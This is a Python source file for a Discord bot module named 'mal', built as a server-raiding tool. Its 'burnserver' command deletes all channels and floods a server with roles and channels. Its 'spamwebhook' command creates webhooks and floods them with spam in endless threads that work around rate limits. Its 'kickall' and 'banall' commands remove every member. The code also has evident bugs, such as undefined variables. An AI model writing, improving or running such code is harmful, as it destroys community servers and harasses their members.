from data.utils.util import *

class mal(Cog):
    def __init__(self, bot):
        self.bot = bot
        self.INV = INV
        self.MSG = MSG
        self.CHNNL = CHNNL


    @command(name="burnserver")
    async def mbase(self, ctx, delay: Optional[int] = 0):
        guild = ctx.guild
    
        await ctx.message.delete()

        await ctx.send(f"Confirm? (y/n) reponse")

        while True:
            try:
                def check_data(message):
                    return message.author == ctx.message.author
                    
                msg = await self.bot.wait_for('message', check=check_data, timeout=int(tm))
                
                if msg.content == "y":
                    await ctx.send(ym)

                    rn = datetime.now()

                    f = open('./data/mallogs.txt', "a")
                    f.write(f"""
=> NUKE COMMAND PROCESS RUN <=
Time: {rn.strftime("%H:%M:%s")}, {rn.strftime("%D:%M:%Y")}
Actioned by: {ctx.message.author.id} ({ctx.message.author.name}#{ctx.message.author.discriminator})
Server executed in: {ctx.guild.name}
Server id: {ctx.guild.id}
                           """)
                    f.close()

                    amount = (250 - len(list(guild.roles)))
                    
                    for i in range(amount):
                        try:
                            await guild.create_role(message)
                            time.sleep(delay/2)
                    
                        except:
                            pass
                    
                    for channel in guild.channels:
                        try:
                            await channel.delete()
                    
                        except:
                            print(f"{channel.name} not deleted")
                    
                    await guild.create_text_channel(name="nuked")
                      
                    for channel in guild.text_channels:
                        
                        cam = (250 - len(list(guild.channels)))
                    
                    for i in range(cam):
                        await guild.create_text_channel(random.choice(CHNNL))
                        time.sleep(delay)

                elif msg.content == "no" or "n":
                    await ctx.send(nm)
                    break

                else:
                    await ctx.send(nam)
                    break

            except:
                pass

    @command(name="spamwebhook", aliases=["swh"])
    async def spamwebhook(self, ctx):

        def whc(webhook):
            while True:
                data = {'content':random.choice(MSG)}
                spamming = requests.post(webhook, json=data)
                spammingerror = spamming.text
              
                if spamming.status_code == 204:
                    continue
                  
                if 'rate limited' in spammingerror.lower():
                    try:
                        j = json.loads(spammingerror)
                        ratelimit = j['retry_after']
                        timetowait = ratelimit / 1000
                        time.sleep(timetowait)
                      
                    except:
                        delay = random.randint(5, 10)
                        time.sleep(delay)
        
                else:
                  delay = random.randint(30, 45)
                  time.sleep(delay)

        await ctx.send(f"Confirm command? (y/n) reponse, case sensitive")

        while True:
            try:
                def check_data(message):
                    return message.author == ctx.message.author
                    
                msg = await self.bot.wait_for('message', check=check_data)
                
                if msg.content == "y":
                    await ctx.send(ym)

                    rn = datetime.now()

                    f = open('./data/mallogs.txt', "a")
                    f.write(f"""
=> WEBHOOK_SPAM COMMAND PROCESS RUN <=
Time: {rn.strftime("%H:%M:%s")}, {rn.strftime("%D:%M:%Y")}
Actioned by: {ctx.message.author.id} ({ctx.message.author.name}#{ctx.message.author.discriminator})
Server executed in: {ctx.guild.name}
Server id: {ctx.guild.id}
                               """)
                    f.close()
        
                    if len(await ctx.guild.webhooks()) != 0:
                        for webhook in await ctx.guild.webhooks():
                            threading.Thread(target=whc, args=(webhook.url,)).start()
                
                    if len(ctx.guild.text_channels) >= 50:
                      
                        lenwh = 2
                      
                    else:
                        lenwh = 100 / len(ctx.guild.text_channels)
                        lenwh = int(lenwh) + 4
                      
                    for i in range(lenwh):
                        for channel in ctx.guild.text_channels:
                            try:
                                webhook = await channel.create_webhook(name='INCURSION WEBHOOK')
                                threading.Thread(target=whc, args=(webhook.url,)).start()
                              
                                f = open('webhooks.txt')
                                f.write(f"{webhook.url} \n")
                                f.close()
                              
                            except:
                                print(f"could not send a message")

                elif msg.content == "n":
                    await ctx.send(nm)
                    return

            except:
                pass

    @command(name="kickall")
    async def kickall(self, ctx):
        await ctx.send(f"Confirm command? (y/n) reponse, case sensitive")

        while True:
            try:
                def check_data(message):
                    return message.author == ctx.message.author
                    
                msg = await self.bot.wait_for('message', check=check_data)
                
                if msg.content == "y":
                    await ctx.send(ym)
                    
                    for member in guild.members:
                        try:
                            await member.kick(reason=reason)
                            
                        except:
                            pass

                        rn = datetime.now()

                        f = open('./data/mallogs.txt', "a")
                        f.write(f"""
=> KICKALL COMMAND PROCESS RUN <=
Time: {rn.strftime("%H:%M:%s")}, {rn.strftime("%D:%M:%Y")}
Actioned by: {ctx.message.author.id} ({ctx.message.author.name}#{ctx.message.author.discriminator})
Server executed in: {ctx.guild.name}
Server id: {ctx.guild.id}
                                   """)
                        f.close()

                elif msg.content == "n":
                    await ctx.send(nm)
                    return
                    
            except:
                pass

    @command(name="banall")
    async def banall(self, ctx):
        await ctx.send(f"Confirm command? (y/n) reponse, case sensitive")

        while True:
            try:
                def check_data(message):
                    return message.author == ctx.message.author
                    
                msg = await self.bot.wait_for('message', check=check_data)
                
                if msg.content == "y":
                    await ctx.send(ym)
                    
                    for member in guild.members:
                        try:
                            await member.ban(reason=reason)
                            
                        except:
                            pass

                        rn = datetime.now()

                        f = open('./data/mallogs.txt', "a")
                        f.write(f"""
=> BANALL COMMAND PROCESS RUN <=
Time: {rn.strftime("%H:%M:%s")}, {rn.strftime("%D:%M:%Y")}
Actioned by: {ctx.message.author.id} ({ctx.message.author.name}#{ctx.message.author.discriminator})
Server executed in: {ctx.guild.name}
Server id: {ctx.guild.id}
                                   """)
                        f.close()

                elif msg.content == "n":
                    await ctx.send(nm)
                    return
                    
            except:
                pass

    @Cog.listener()
    async def on_ready(self):
        print('mal.py connected')

def setup(bot):
    bot.add_cog(mal(bot))